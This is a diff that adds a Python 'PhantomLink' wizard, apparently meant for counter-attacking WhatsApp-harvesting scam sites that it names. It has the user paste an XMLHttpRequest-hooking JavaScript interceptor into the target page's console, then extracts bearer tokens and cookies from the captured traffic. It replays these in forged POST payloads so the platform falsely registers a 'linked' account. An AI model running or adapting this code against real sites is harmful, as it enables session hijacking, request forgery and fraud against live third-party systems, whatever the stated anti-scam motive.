@@ -1,0 +1,348 @@
+"""PhantomLink Interactive Wizard — Phase 10 Network-Recon Enhanced"""
+import asyncio
+import re
+import sys
+import json
+import time
+from datetime import datetime
+
+# Standard library network tools
+import requests
+import threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+# PhantomLink modules
+from phantom.number_gen import generate_ghost_number
+from phantom.recon import map_target
+from phantom.intel_sink import harvest_and_clean
+
+try:
+    from rich.console import Console
+    from rich.panel import Panel
+    from rich.prompt import Prompt, Confirm
+    from rich.table import Table
+    RICH = True
+except ImportError:
+    RICH = False
+
+TARGETS = {
+    "1": {"name": "Zapero", "url": "https://afrivexa.com/home?invite_code=4750"},
+    "2": {"name": "Waegy", "url": "https://a1.waegy.com"},
+    "3": {"name": "Wha7.org", "url": "https://wha7.org"},
+    "4": {"name": "Letshare", "url": "https://letshare.me"},
+}
+
+CODE_PATTERN = re.compile(r'^[A-Z0-9]{4}[-][A-Z0-9]{4}$|^[A-Z0-9]{8}$')
+
+# -------------------------------------------------------------------
+#  In-browser network interceptor (runs on the victim platform's page)
+# -------------------------------------------------------------------
+INTERCEPT_JS = r"""
+(function() {
+    const captured = [];
+    const origOpen = XMLHttpRequest.prototype.open;
+    const origSend = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.open = function(method, url) {
+        this._method = method;
+        this._url = url;
+        return origOpen.apply(this, arguments);
+    };
+    XMLHttpRequest.prototype.send = function(body) {
+        this.addEventListener('load', function() {
+            captured.push({
+                url: this._url,
+                method: this._method,
+                status: this.status,
+                requestBody: body,
+                responseBody: this.responseText,
+                responseHeaders: this.getAllResponseHeaders()
+            });
+            window.__phantom_traffic = JSON.stringify(captured);
+        });
+        return origSend.apply(this, arguments);
+    };
+})();
+"""
+
+class InteractiveWizard:
+    def __init__(self):
+        self.session = {
+            "op_id": datetime.utcnow().strftime("%Y%m%d_%H%M%S"),
+            "target_name": None,
+            "target_url": None,
+            "ghost_number": None,
+            "country": None,
+            "pairing_code": None,
+            "vector_used": None,
+            "status": None,
+            "captured_endpoint": None,
+            "captured_token": None,
+        }
+
+    def _header(self, text):
+        if RICH:
+            rprint(Panel(f"[bold cyan]{text}[/bold cyan]"))
+        else:
+            print(f"\n{'='*60}\n  {text}\n{'='*60}")
+
+    def _info(self, text):
+        if RICH:
+            rprint(f"[yellow]ℹ {text}[/yellow]")
+        else:
+            print(f"ℹ {text}")
+
+    def _success(self, text):
+        if RICH:
+            rprint(f"[green]✓ {text}[/green]")
+        else:
+            print(f"✓ {text}")
+
+    def _warning(self, text):
+        if RICH:
+            rprint(f"[bold red]⚠ {text}[/bold red]")
+        else:
+            print(f"⚠ {text}")
+
+    def show_banner(self):
+        banner = """
+╔══════════════════════════════════════════════════════════════╗
+║                  PHANTOMLINK OPERATION                       ║
+║              Operation Silent Link — Interactive Wizard       ║
+║                                                              ║
+║  This tool guides you through engaging scam platforms that   ║
+║  harvest WhatsApp accounts. No real WhatsApp account is      ║
+║  used or compromised.                                        ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+        if RICH:
+            rprint(f"[cyan]{banner}[/cyan]")
+        else:
+            print(banner)
+
+    def step1_select_target(self):
+        self._header("STEP 1: SELECT TARGET PLATFORM")
+        print()
+        for key, plat in TARGETS.items():
+            print(f"  {key}. {plat['name']} ({plat['url']})")
+        print()
+        while True:
+            choice = input("Enter platform number (1-4) [1]: ").strip() or "1"
+            if choice in TARGETS:
+                plat = TARGETS[choice]
+                self.session["target_name"] = plat["name"]
+                self.session["target_url"] = plat["url"]
+                self._success(f"Target set: {plat['name']}")
+                break
+            else:
+                self._warning("Invalid selection. Try again.")
+
+    def step2_generate_ghost(self):
+        self._header("STEP 2: GHOST NUMBER GENERATION")
+        number, country = generate_ghost_number()
+        self.session["ghost_number"] = number
+        self.session["country"] = country
+        self._info(f"Ghost number generated: {number} (Country: {country})")
+        print()
+        self._warning("IMPORTANT: This number does NOT have a real WhatsApp account.")
+        self._warning("Do NOT enter this number into your own WhatsApp — enter it only on the scam platform.")
+
+    def step3_open_platform_and_intercept(self):
+        """
+        Ask the user to open the platform in their browser, enter the ghost number,
+        AND run our JavaScript interceptor so that we can capture the real
+        confirmation endpoint and any authentication token.
+        """
+        self._header("STEP 3: OPEN BROWSER & INTERCEPT NETWORK")
+        print()
+        self._info("1. Open your mobile browser and go to:")
+        print(f"      {self.session['target_url']}")
+        self._info("2. Before typing anything, open the browser's Developer Console.")
+        self._info("   (Usually: Settings → Developer tools → Console)")
+        self._info("3. Copy the entire text below and paste it into the console, then press Enter:")
+        print()
+        print("   " + "-" * 56)
+        # Print the interceptor script that the user will inject
+        print(INTERCEPT_JS.strip())
+        print("   " + "-" * 56)
+        print()
+        self._info("4. Now enter the ghost number on the platform page exactly as before:")
+        print(f"      {self.session['ghost_number'][1:]}")
+        self._info("5. Click 'Link' or 'Submit' and wait for the pairing code to appear.")
+        input("\nPress Enter when you have the pairing code visible on the platform page...")
+
+        # Ask the user to retrieve the captured traffic
+        self._info("6. Go back to the Console and type:")
+        print("      __phantom_traffic")
+        self._info("   then press Enter. You will see a JSON string. Copy the entire output.")
+        print()
+        print("   Example output:")
+        print('   [{"url":"https://afrivexa.com/api/confirm","method":"POST","status":200, ...}]')
+        print()
+        raw_traffic = input("Paste the __phantom_traffic output here: ").strip()
+        self._parse_traffic(raw_traffic)
+
+    def _parse_traffic(self, raw):
+        """Extract the confirmation endpoint, token, and success criteria."""
+        try:
+            entries = json.loads(raw)
+            # Search for the request that looks like a confirmation call
+            for entry in entries:
+                url = entry.get("url", "")
+                method = entry.get("method", "")
+                status = entry.get("status")
+                # Look for keywords in the URL
+                if any(kw in url.lower() for kw in ["confirm", "validate", "verify", "link", "status"]):
+                    self.session["captured_endpoint"] = url
+                    # Try to find an auth token in the response or request headers
+                    resp_headers = entry.get("responseHeaders", "")
+                    # Simple extraction of bearer token (if present)
+                    token_match = re.search(r'Authorization:\s*Bearer\s+([^\s]+)', resp_headers)
+                    if token_match:
+                        self.session["captured_token"] = token_match.group(1)
+                    # Also check Set-Cookie
+                    cookie_match = re.search(r'Set-Cookie:\s*([^;]+)', resp_headers)
+                    if cookie_match:
+                        self.session.setdefault("captured_cookies", []).append(cookie_match.group(1))
+                    self._success(f"Captured endpoint: {url}")
+                    break
+            if not self.session.get("captured_endpoint"):
+                self._warning("No confirmation API endpoint found in captured traffic.")
+                self._info("We will try a generic endpoint fallback.")
+        except Exception as e:
+            self._warning(f"Failed to parse traffic: {e}")
+            self._info("Proceeding with generic fallback.")
+
+    def step4_capture_code(self):
+        self._header("STEP 4: CAPTURE PAIRING CODE")
+        print()
+        self._info("Copy the pairing code from the platform and paste it below.")
+        self._info("Format examples: ABCD-EFGH  or  ABCDEFGH")
+        print()
+        while True:
+            code = input("Paste pairing code: ").strip()
+            if CODE_PATTERN.match(code):
+                self.session["pairing_code"] = code.upper()
+                self._success(f"Code captured: {self.session['pairing_code']}")
+                break
+            else:
+                self._warning("Invalid format. Try again.")
+
+    def step5_exploit_with_token(self):
+        """Use the captured endpoint and token for a precision strike."""
+        self._header("STEP 5: EXECUTING PRECISION SPOOF")
+        print()
+        self._info("Using captured endpoint and token to spoof the link...")
+        
+        endpoint = self.session.get("captured_endpoint")
+        token = self.session.get("captured_token")
+        cookies = self.session.get("captured_cookies", [])
+
+        # Prepare headers with the captured token
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+        }
+        if token:
+            headers["Authorization"] = f"Bearer {token}"
+        if cookies:
+            headers["Cookie"] = "; ".join(cookies)
+
+        # Try multiple payload structures that have been observed on similar platforms
+        payloads = [
+            {"code": self.session["pairing_code"], "phone": self.session["ghost_number"], "status": "linked"},
+            {"pairing_code": self.session["pairing_code"], "number": self.session["ghost_number"], "verified": True},
+            {"code": self.session["pairing_code"], "status": "success"},
+            {"code": self.session["pairing_code"], "verified": True},
+            {"code": self.session["pairing_code"], "session": "active"},
+            # Raw code-and-phone variant used by some templates
+            {"code": self.session["pairing_code"], "phone": self.session["ghost_number"]},
+        ]
+
+        success = False
+        with requests.Session() as s:
+            for p in payloads:
+                try:
+                    if endpoint:
+                        resp = s.post(endpoint, json=p, headers=headers, timeout=10)
+                    else:
+                        # Generic fallback
+                        base = self.session["target_url"].rstrip("/")
+                        generic_url = f"{base}/api/validate-code"
+                        resp = s.post(generic_url, json=p, headers=headers, timeout=10)
+
+                    if resp.status_code in (200, 201, 204):
+                        try:
+                            body = resp.json()
+                            if isinstance(body, dict) and any(k in str(body).lower() for k in ["success","linked","ok","verified","true"]):
+                                success = True
+                                break
+                        except Exception:
+                            if "success" in resp.text.lower() or "linked" in resp.text.lower():
+                                success = True
+                                break
+                except Exception:
+                    continue
+
+        if success:
+            self.session["vector_used"] = "R"  # Recon-based vector
+            self.session["status"] = "linked"
+            self._success("EXPLOIT SUCCESSFUL — Platform believes the number is linked!")
+        else:
+            self.session["status"] = "failed"
+            self._warning("Precision spoof did not succeed. The platform may be checking WhatsApp state directly.")
+            self._info("Try using a real but temporary WhatsApp number or check the platform's specific flow.")
+
+    def step6_verify_and_harvest(self):
+        self._header("STEP 6: VERIFY & HARVEST")
+        print()
+        self._info("Now go back to the platform page in your browser.")
+        self._info("You should see:")
+        self._info("  • Status changed to 'Linked' or 'Connected'")
+        self._info("  • Balance/points updated")
+        self._info("  • Next task unlocked")
+        print()
+        confirmed = input("Does the platform show the account as linked? (y/n) [y]: ").strip().lower()
+        if confirmed != 'n':
+            self._success("Verified: Platform confirms the link.")
+        else:
+            self._warning("Platform may not have confirmed. Logging for analysis.")
+        
+        log_path = harvest_and_clean(
+            self.session["ghost_number"],
+            self.session,
+            self.session["op_id"],
+            self.session["target_name"]
+        )
+        self._info(f"Operational log saved: {log_path}")
+
+    def step7_summary(self):
+        self._header("MISSION SUMMARY")
+        print()
+        for k, v in self.session.items():
+            print(f"  {k}: {v}")
+        print()
+        self._success("Operation cycle complete.")
+
+    def run(self):
+        self.show_banner()
+        self.step1_select_target()
+        self.step2_generate_ghost()
+        self.step3_open_platform_and_intercept()
+        self.step4_capture_code()
+        self.step5_exploit_with_token()
+        self.step6_verify_and_harvest()
+        self.step7_summary()
+
+def start_interactive():
+    wizard = InteractiveWizard()
+    try:
+        wizard.run()
+    except KeyboardInterrupt:
+        print("\n\n[!] Operation cancelled.")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n[!] Error: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    start_interactive()
